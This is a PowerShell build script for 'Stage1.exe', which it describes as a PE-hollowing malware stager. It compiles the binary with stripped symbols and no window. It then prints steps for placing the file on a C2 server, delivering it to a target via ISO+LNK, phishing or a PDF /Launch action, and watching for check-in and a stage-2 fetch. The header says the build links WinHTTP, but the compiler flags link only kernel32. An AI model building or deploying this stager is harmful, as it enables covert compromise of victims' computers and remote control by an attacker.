# Build Stage1.exe — minimal PE-hollowing stager
# No CryptoPP needed. Links only WinHTTP + system DLLs.
#
# Usage:
#   .\build.ps1
#   .\build.ps1 -MinGW "C:\mingw64"

param([string]$MinGW = "")

$StageDir = $PSScriptRoot
Set-Location $StageDir

# Auto-detect MinGW
if (-not $MinGW) {
    $candidates = @(
        "C:\MinGW","C:\mingw64","C:\msys64\mingw64",
        "C:\msys64\ucrt64","C:\mingw-w64"
    )
    foreach ($c in $candidates) {
        if (Test-Path "$c\bin\g++.exe") { $MinGW = $c; break }
    }
    if (-not $MinGW) {
        $g = Get-Command g++ -ErrorAction SilentlyContinue
        if ($g) { $MinGW = Split-Path (Split-Path $g.Source) }
    }
    if (-not $MinGW) {
        Write-Host "ERROR: MinGW g++ not found." -ForegroundColor Red
        Write-Host "Add it to PATH or pass -MinGW <path>."
        exit 1
    }
}
$env:PATH = "$MinGW\bin;$env:PATH"
Write-Host "[INFO] MinGW: $MinGW"

Write-Host "[1/2] Compiling Stage1.cpp..."

$args = @(
    'Stage1.cpp',
    '-std=c++17', '-O2', '-mwindows',
    '-s', '-fno-ident',
    '-ffunction-sections', '-fdata-sections',
    '-Wl,--gc-sections',
    '-static-libgcc', '-static-libstdc++',
    '-lkernel32',
    '-o', 'Stage1.exe'
)

& g++ @args

if ($LASTEXITCODE -ne 0) {
    Write-Host "Build FAILED" -ForegroundColor Red
    exit 1
}

Write-Host "[2/2] Done." -ForegroundColor Green
$sz = [math]::Round((Get-Item "Stage1.exe").Length / 1024)
Write-Host "Stage1.exe: $sz KB"
Write-Host ""
Write-Host "Next steps:"
Write-Host "  1. Copy Stage1.exe  ->  c2-server\downloads\Stage1.exe"
Write-Host "  2. Deliver Stage1.exe to target (ISO+LNK, phish, PDF /Launch)"
Write-Host "  3. Watch Stager tab for check-in + stage 2 fetch"
